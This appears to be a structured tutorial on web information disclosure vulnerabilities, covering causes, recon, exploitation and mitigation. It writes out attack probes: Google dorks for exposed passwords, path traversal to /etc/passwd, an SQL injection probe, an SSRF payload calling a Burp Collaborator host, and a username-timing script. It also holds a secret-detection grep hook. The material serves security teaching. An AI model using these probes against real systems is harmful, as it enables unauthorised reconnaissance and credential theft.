## Information Disclosure Vulnerabilities

- **What information disclosure is**
  - The unintentional revelation of sensitive information to users or attackers
  - Also known as information leakage
  - Occurs when applications expose internal data, technical details, or sensitive business information
  - Often serves as a stepping stone for more severe attacks by providing valuable context
  - Can directly lead to security breaches when revealing credentials or sensitive user data
  - Common entry point for further exploitation of application vulnerabilities
  - Security impact ranges from minimal to severe depending on the disclosed information

- **Types of information disclosure**
  
  - **Technical information leakage**
    - Server and infrastructure details
    - Framework and component versions
    - File system structure and paths
    - Internal IP addresses and hostnames
    - Software architecture and dependencies
    - Development information (staging URLs, test accounts)
    - Debugging data and logs
  
  - **Business and user data leakage**
    - User credentials and personal information
    - Financial and payment details
    - Intellectual property and proprietary algorithms
    - Business logic and workflows
    - Commercial data (pricing strategies, internal metrics)
    - API keys and access tokens
    - Customer lists and relationships
  
  - **Metadata leakage**
    - Document metadata (author names, creation dates)
    - Image EXIF data (geolocation, camera details)
    - HTTP response headers revealing technology details
    - Code comments containing sensitive information
    - Hidden form fields with internal references
    - Usage and analytics data

- **How information disclosure vulnerabilities arise**
  
  - **Developer oversight**
    - Comments left in production code
    - Debug code not removed before deployment
    - Detailed error messages exposed to users
    - Hardcoded credentials and API keys
    - Backup files accidentally published
    - Placeholder data containing real information
  
  - **Misconfiguration issues**
    - Default server configurations left unchanged
    - Overly permissive file permissions
    - Directory listing enabled
    - Verbose error handling
    - Development features enabled in production
    - Insecure HTTP headers
    - Missing access controls on sensitive endpoints
  
  - **Design and implementation flaws**
    - Inadequate input validation
    - Insecure direct object references
    - Race conditions revealing data
    - Inconsistent error handling leading to enumeration
    - Excessive data exposure in APIs
    - Client-side caching of sensitive data
    - Insecure storage of sensitive information

- **Identifying information disclosure vulnerabilities**
  
  - **Reconnaissance techniques**
    
    - **Public resources examination**
      - Search engines (Google dorking)
        - Examples:
          - `site:example.com filetype:pdf`
          - `site:example.com filetype:txt password`
          - `site:example.com "internal use only"`
          - `site:example.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini`
      - Website archives (Wayback Machine)
      - Public code repositories (GitHub, GitLab)
        - Search for company names, domains, and known developers
        - Look for configuration files, database credentials, and API keys
      - Public document metadata
        - Extract metadata from PDFs and documents using tools like ExifTool
        - Example command: `exiftool -a -u company-brochure.pdf`
    
    - **Web crawling and spidering**
      - Use tools like Burp Suite Spider or OWASP ZAP Spider
      - Analyze robots.txt and sitemap.xml files
      - Extract and analyze comments in HTML/JS/CSS
      - Check for hidden directories and backup files
        - Common patterns: `.bak`, `.old`, `.backup`, `.temp`, `~`, `.swp`
        - Example patterns to check:
          - `index.php.bak`
          - `config.js.old`
          - `application.yml~`
    
    - **Technology fingerprinting**
      - Analyze HTTP response headers
        - Server, X-Powered-By, X-AspNet-Version
      - Identify technology stacks and frameworks
      - Example tool usage: `whatweb example.com`
      - Use tools like Wappalyzer to identify technologies
      - Check for framework-specific files and paths
        - Example paths to probe:
          - `/wp-content/` (WordPress)
          - `/administrator/` (Joomla)
          - `/console` (Spring Boot)
  
  - **Error-based information gathering**
    
    - **Forced error techniques**
      - Submit invalid data to forms and parameters
        - Example: `'` in search forms to trigger SQL errors
        - Sending unexpected data types (text in numeric fields)
      - Manipulate request methods (change GET to POST)
      - Modify content types and accept headers
        - Example: Change `application/json` to `application/xml`
      - Send invalid cookies or session tokens
      - Use boundary test cases (empty values, extremely large values)
        - Example: Submit string of 10,000 characters to username field
    
    - **HTTP status code analysis**
      - Differentiate between various error codes
      - Analyze verbose 4xx and 5xx error responses
      - Create a map of which inputs trigger which errors
      - Look for inconsistencies in error handling
    
    - **Stack trace analysis**
      - Identify technologies from stack traces
      - Extract class names and method calls
      - Find server paths and directory structures
      - Look for database connection strings
      - Example of valuable stack trace:
        ```
        java.sql.SQLException: Access denied for user 'webapp'@'10.0.0.1' (using password: YES)
            at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:964)
            at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3973)
            at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3909)
            at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:873)
            at com.mysql.jdbc.MysqlIO.proceedHandshakeWithPluggableAuthentication(MysqlIO.java:1710)
            at com.mysql.jdbc.MysqlIO.doHandshake(MysqlIO.java:1226)
            at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2188)
            at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2219)
            at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2014)
            at com.mysql.jdbc.ConnectionImpl.<init>(ConnectionImpl.java:776)
            at com.mysql.jdbc.JDBC4Connection.<init>(JDBC4Connection.java:47)
            at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
            at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
            at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
            at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
            at com.mysql.jdbc.Util.handleNewInstance(Util.java:425)
            at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:386)
            at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330)
            at java.sql.DriverManager.getConnection(DriverManager.java:664)
            at java.sql.DriverManager.getConnection(DriverManager.java:247)
            at com.example.shop.database.DatabaseConnector.connect(DatabaseConnector.java:28)
            at com.example.shop.servlet.ProductServlet.doGet(ProductServlet.java:104)
        ```
  
  - **Parameter manipulation techniques**
    
    - **Parameter tampering**
      - Modify parameter values to reveal different information
      - Test for IDOR (Insecure Direct Object References)
        - Example: Change `user_id=123` to `user_id=124`
      - Probe numeric parameter boundaries
      - Test different parameter formats (decimal, hex, etc.)
    
    - **HTTP header manipulation**
      - Test custom headers: `X-Forwarded-For`, `X-Original-URL`
      - Modify content negotiation headers
        - Example: Use `Accept: application/xml` instead of `Accept: application/json`
      - Add debug headers like `X-Debug: true`
      - Use non-standard headers to trigger verbose responses
        - Example: `X-Debug-Mode: 1`
    
    - **Hidden parameter discovery**
      - Use tools like Arjun to discover hidden parameters
      - Test for debug parameters (`debug`, `test`, `developer`, `trace`)
        - Example: `https://example.com/api/users?debug=true`
      - Check for feature flags and experimental features
        - Example: `https://example.com/login?beta=1`
      - Look for environment-specific parameters
        - Example: `https://example.com/app?env=dev`

- **Exploiting information disclosure**
  
  - **Examining source code and comments**
    
    - **HTML source analysis**
      - Look for commented out code blocks
      - Check for hidden form fields with sensitive data
      - Analyze JavaScript code included in pages
      - Inspect client-side validation logic for insights
      - Example HTML comment disclosure:
        ```html
        <!-- TODO: Remove admin backdoor before production: /admin-pages/backdoor.php?access=superuser123 -->
        ```
    
    - **JavaScript analysis**
      - Analyze minified and obfuscated JavaScript
        - Use tools like `js-beautify` for deobfuscation
      - Check for hardcoded credentials and API keys
      - Identify endpoints mentioned in AJAX calls
      - Look for client-side security controls
      - Extract business logic information
      - Example JavaScript with API key:
        ```javascript
        const apiClient = new ApiClient({
          endpoint: 'https://api.internal.example.com/v2',
          apiKey: 'AIzaSyB8NDhx7S2SdEZCK74JKcm5xKkZuC0Z9X0',
          secretKey: 'SK_live_928aJs92HH22i9jBjs02js2K'
        });
        ```
    
    - **CSS inspection**
      - Analyze selectors that might reveal structure
      - Look for URLs to resources and assets
      - Check for user roles/permissions in class names
      - Example revealing CSS:
        ```css
        /* Styling for admin-only features */
        .admin-dashboard-link { display: none; }
        .user-role-admin .admin-dashboard-link { display: block; }
        ```
  
  - **Server and infrastructure probing**
    
    - **Version disclosure exploitation**
      - Research known vulnerabilities for identified versions
      - Match server banners to CVE databases
      - Example: Apache 2.4.49 is vulnerable to path traversal (CVE-2021-41773)
    
    - **Path traversal techniques**
      - Test for directory traversal to access files
        - Example: `https://example.com/images/../../../etc/passwd`
      - Use encoded traversal sequences: `%2e%2e%2f` (../)
      - Try alternate encodings and edge cases
        - Example: `....//` or `..;/`
      - Test common sensitive files:
        - `/etc/passwd` (Unix)
        - `/windows/win.ini` (Windows)
        - `WEB-INF/web.xml` (Java web apps)
        - `wp-config.php` (WordPress)
    
    - **Default files and directories**
      - Test for common configuration files
        - Example paths to check:
          - `/robots.txt`
          - `/.git/config`
          - `/.env`
          - `/app/config/parameters.yml`
          - `/phpinfo.php`
          - `/server-status`
      - Probe for backup files of known resources
        - Example: If `/index.php` exists, try `/index.php~`
      - Check for temporary files
        - Example: `.swp` files for vim, `.bak` for backups
  
  - **Error-based exploitation**
    
    - **Verbose error messages**
      - Extract database information from SQL errors
      - Gather system paths from file operation errors
      - Collect usernames from authentication errors
      - Example SQL error:
        ```
        Error: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'usrename' in 'where clause' in query:
        SELECT * FROM users WHERE usrename='admin' AND password='pass123'
        ```
    
    - **Differential analysis**
      - Compare responses for valid vs. invalid inputs
      - Analyze timing differences
      - Note differences in error messages for existing vs. non-existing resources
        - Example: "Invalid password" vs. "User does not exist"
      - Use status code differences to enumerate resources
    
    - **API documentation exposure**
      - Check for exposed Swagger/OpenAPI documentation
        - Common paths: `/swagger-ui.html`, `/api-docs`, `/openapi.json`
      - Look for GraphQL introspection
        - Try: `/graphql?query={__schema{types{name,fields{name}}}}`
      - Extract endpoint information and parameters
      - Identify authentication requirements
  
  - **File metadata analysis**
    
    - **Document metadata extraction**
      - Analyze PDFs, Office documents, and images
      - Extract creator information, usernames, software versions
      - Look for embedded comments and revision history
      - Example ExifTool command:
        ```bash
        exiftool -a -u company-document.docx
        ```
    
    - **Image EXIF data**
      - Extract geolocation from photos
      - Identify devices and software used
      - Find timestamps and user information
      - Example EXIF data revealing location:
        ```
        GPS Latitude : 40 deg 42' 46.02" N
        GPS Longitude: 74 deg 0' 21.49" W
        ```
    
    - **HTTP response header analysis**
      - Extract server information from headers
        - Example: `Server: Apache/2.4.41 (Ubuntu)`
        - Example: `X-Powered-By: PHP/7.4.3`
      - Look for custom headers revealing internal information
        - Example: `X-Application-Version: myapp-2.5.3-beta`
      - Check for information in caching headers
      - Analyze cookie attributes for clues

- **Advanced information disclosure techniques**
  
  - **Indirect information gathering**
    
    - **Timing analysis**
      - Measure response time differences
      - Use timing for username enumeration
        - Example: Account existence check might take longer for valid users
      - Detect server-side operations through delays
      - Example Python script for timing analysis:
        ```python
        import requests
        import time
        
        usernames = ['admin', 'user', 'test', 'guest']
        for username in usernames:
            start_time = time.time()
            response = requests.post('https://example.com/login', 
                                    data={'username': username, 'password': 'invalid'})
            duration = time.time() - start_time
            print(f"Username: {username}, Time: {duration:.4f}s, Status: {response.status_code}")
        ```
    
    - **Behavior analysis**
      - Compare functionality differences between user roles
      - Observe client-side interface changes
      - Monitor redirects and navigation flows
      - Analyze response structure differences
    
    - **Memory analysis**
      - Check browser memory and local storage
      - Inspect JavaScript variables in browser console
      - Look for data cached in DOM
  
  - **Chaining information leaks**
    
    - **Combining multiple disclosures**
      - Use version information to exploit known CVEs
      - Leverage exposed usernames for further attacks
      - Combine path discovery with access control bypass
      - Example attack chain:
        ```
        1. Discover server version from HTTP headers
        2. Find known vulnerability for the version
        3. Use path disclosure to locate configuration files
        4. Extract credentials from config files
        5. Access admin interface with stolen credentials
        ```
    
    - **Cross-site leaks**
      - Exploit browser features to extract cross-origin data
      - Use timing attacks to infer information
      - Extract data via error messages
    
    - **API misconfigurations**
      - Test for over-permissive CORS settings
      - Check for verbose API error messages
      - Probe for debug endpoints
        - Example: `/api/debug/users`
  
  - **Out-of-band information disclosure**
    
    - **DNS and HTTP interactions**
      - Use Server-Side Request Forgery (SSRF) to probe internal networks
      - Force DNS lookups to extract data
      - Example DNS exfiltration payload:
        ```
        https://example.com/api?url=http://internal-data.burpcollaborator.net
        ```
    
    - **Cache poisoning**
      - Use web cache poisoning to expose internal data
      - Target caching mechanisms to retrieve sensitive information
    
    - **Cross-protocol exploitation**
      - Use HTTP to interact with non-HTTP services
      - Extract information through protocol conversion errors

- **Exploiting specific information disclosure vulnerabilities**
  
  - **Debug endpoints and features**
    
    - **Development features**
      - Test for debug modes and endpoints
        - Example paths: `/debug`, `/dev`, `/test`, `/admin/debug`
      - Look for debugging parameters
        - Example: `?debug=true`, `?trace=1`, `?profile=1`
      - Check for developer tools left enabled
        - Example: Spring Boot Actuator endpoints (`/actuator/health`, `/actuator/env`)
    
    - **Application tracing**
      - Enable extended logging and tracing
      - Check for request tracing functionality
        - Example: `/api?XDEBUG_SESSION_START=1`
      - Look for performance monitoring exposing data
      - Example response with tracing:
        ```json
        {
          "data": {
            "user": "John Doe"
          },
          "debug": {
            "sql": "SELECT * FROM users WHERE id = 42",
            "processing_time": "0.023s",
            "cache_hit": false,
            "memory_usage": "4.2MB"
          }
        }
        ```
    
    - **Framework debug modes**
      - Test framework-specific debug features
        - PHP: `?XDEBUG_SESSION_START=phpstorm`
        - Django: `?debug=True`
        - Laravel: `.env` file exposure
        - Rails: `/rails/info/properties`
        - Spring Boot: `/env`, `/beans`, `/heapdump`
      - Identify development environments
        - Example: Check for `/app_dev.php` in Symfony applications
  
  - **API and endpoint information disclosure**
    
    - **GraphQL introspection**
      - Test for enabled introspection
        - Example query:
          ```graphql
          {
            __schema {
              types {
                name
                fields {
                  name
                  type {
                    name
                    kind
                  }
                }
              }
            }
          }
          ```
      - Extract schema information
      - Identify hidden fields and operations
    
    - **API versioning information**
      - Test older API versions which might be less secure
      - Compare documentation between versions
      - Look for deprecated endpoints still accessible
      - Example: If `/api/v2/users` exists, try `/api/v1/users`
    
    - **Internal API exposure**
      - Look for internal APIs accidentally exposed
      - Check for development/staging APIs
      - Test for administrative API endpoints
      - Example paths to try:
        - `/api/internal`
        - `/api/admin`
        - `/api/private`
        - `/api/system`
  
  - **Database information disclosure**
    
    - **SQL error messages**
      - Trigger errors to reveal database schemas
      - Extract table and column names
      - Identify database versions and types
      - Example error-triggering payloads:
        - `'` (single quote)
        - `1/0` (division by zero)
        - `' OR '1'='1` (SQL injection probe)
    
    - **NoSQL information leakage**
      - Test for MongoDB query exposure
      - Look for JSON parsing errors revealing structure
      - Check for exposed Elasticsearch queries
    
    - **ORM framework details**
      - Identify ORM errors exposing model structures
      - Look for framework-specific error patterns
      - Extract relationship information between entities

- **Information disclosure through side channels**
  
  - **User enumeration**
    
    - **Login errors**
      - Analyze differences in login error messages
        - Example: "Invalid password" vs. "User not found"
      - Test password reset functionality
        - Example: Error message "Email sent" only for valid accounts
      - Look for timing differences
    
    - **Account registration**
      - Test if usernames or emails can be enumerated
        - Example: "Username already taken" messages
      - Check for social media integration revealing users
      - Analyze profile picture URLs for patterns
    
    - **Email verification**
      - Test for email address confirmation revealing validity
      - Check for differences in behavior for existing vs. non-existing accounts
  
  - **Data validation reveals information**
    
    - **Input validation leaks**
      - Analyze validation error messages
        - Example: "Password must be different from last 5 passwords"
      - Test for field constraints revealing business rules
        - Example: "Price discount cannot exceed 30%"
      - Look for data format requirements leaking information
        - Example: "Employee ID must follow format XXX-YYYYY"
    
    - **Response analysis**
      - Compare responses between similar requests
      - Look for inconsistencies in data handling
      - Analyze response timings for information leaks
    
    - **HTTP status code information**
      - Extract information from status codes
        - Example: 403 vs. 404 revealing resource existence
      - Map different responses to user actions
      - Identify permission and access patterns

- **Prevention and mitigation**
  
  - **Secure development practices**
    
    - **Sensitive data handling**
      - Implement proper data classification
      - Apply the principle of least privilege
      - Minimize data exposure in responses
      - Example: Instead of sending full user object:
        ```json
        // BAD - exposes too much
        {
          "user": {
            "id": 123,
            "username": "john_doe",
            "email": "john@example.com",
            "password_hash": "$2y$10$AbC123XyZ",
            "auth_token": "eyJhbGciOiJ...",
            "role": "admin",
            "last_login": "2023-05-01T12:34:56Z",
            "created_at": "2022-01-15T00:00:00Z",
            "credit_card": "XXXX-XXXX-XXXX-1234"
          }
        }
        
        // GOOD - minimizes exposure
        {
          "user": {
            "id": 123,
            "username": "john_doe"
          }
        }
        ```
    
    - **Error handling**
      - Implement generic error messages
      - Create a centralized error handling system
      - Log detailed errors server-side only
      - Return consistent error responses
      - Example proper error handling:
        ```javascript
        try {
          // Operation that might fail
        } catch (error) {
          // Log detailed error server-side
          logger.error(`Database error: ${error.message}`, {
            stack: error.stack,
            query: query,
            userId: user.id
          });
          
          // Return generic message to client
          return {
            error: "An error occurred processing your request",
            code: "OPERATION_FAILED"
          };
        }
        ```
    
    - **Code review and scanning**
      - Implement security code reviews
      - Use static application security testing (SAST)
      - Scan for hardcoded secrets
      - Automate detection of information disclosure
      - Example Git hook for secret detection:
        ```bash
        #!/bin/bash
        
        if git diff --cached | grep -E '(SECRET|API_KEY|PASSWORD|TOKEN|CREDENTIAL).*=.*[A-Za-z0-9/+]{8,}'; then
          echo "Potential secret detected in commit!"
          exit 1
        fi
        ```
  
  - **Server and infrastructure hardening**
    
    - **Server configuration**
      - Disable directory listings
      - Remove unnecessary HTTP headers
      - Configure proper error pages
      - Apply least privilege principle to service accounts
      - Example Nginx configuration:
        ```nginx
        # Disable directory listing
        autoindex off;
        
        # Custom error pages
        error_page 403 /error/403.html;
        error_page 404 /error/404.html;
        error_page 500 502 503 504 /error/50x.html;
        
        # Remove version information
        server_tokens off;
        
        # Headers configuration
        add_header X-Content-Type-Options nosniff;
        add_header X-Frame-Options SAMEORIGIN;
        add_header X-XSS-Protection "1; mode=block";
        ```
    
    - **HTTP header management**
      - Remove or sanitize revealing headers
        - Example headers to control:
          - Server
          - X-Powered-By
          - X-AspNet-Version
          - X-Runtime
      - Add security headers
      - Configure Content Security Policy
      - Example headers to add:
        ```
        X-Content-Type-Options: nosniff
        Strict-Transport-Security: max-age=31536000; includeSubDomains
        Content-Security-Policy: default-src 'self'
        Referrer-Policy: no-referrer-when-downgrade
        ```
    
    - **Framework and CMS hardening**
      - Disable debugging and development features in production
      - Apply security patches and updates
      - Remove unused modules and components
      - Configure secure defaults
      - Example: Disabling PHP information disclosure:
        ```php
        // php.ini settings
        display_errors = Off
        display_startup_errors = Off
        error_reporting = E_ALL & ~E_DEPRECATED & ~E_STRICT
        log_errors = On
        expose_php = Off
        ```
  
  - **Ongoing security practices**
    
    - **Regular security assessments**
      - Perform periodic vulnerability scanning
      - Conduct penetration testing
      - Use OSINT techniques to discover leaked information
      - Implement continuous security monitoring
    
    - **Developer training**
      - Train developers on secure coding practices
      - Create awareness about information disclosure risks
      - Implement security champions program
      - Promote secure by design principles
    
    - **Third-party components management**
      - Maintain inventory of third-party components
      - Monitor for vulnerabilities in dependencies
      - Review default configurations of integrated systems
      - Implement software composition analysis (SCA)
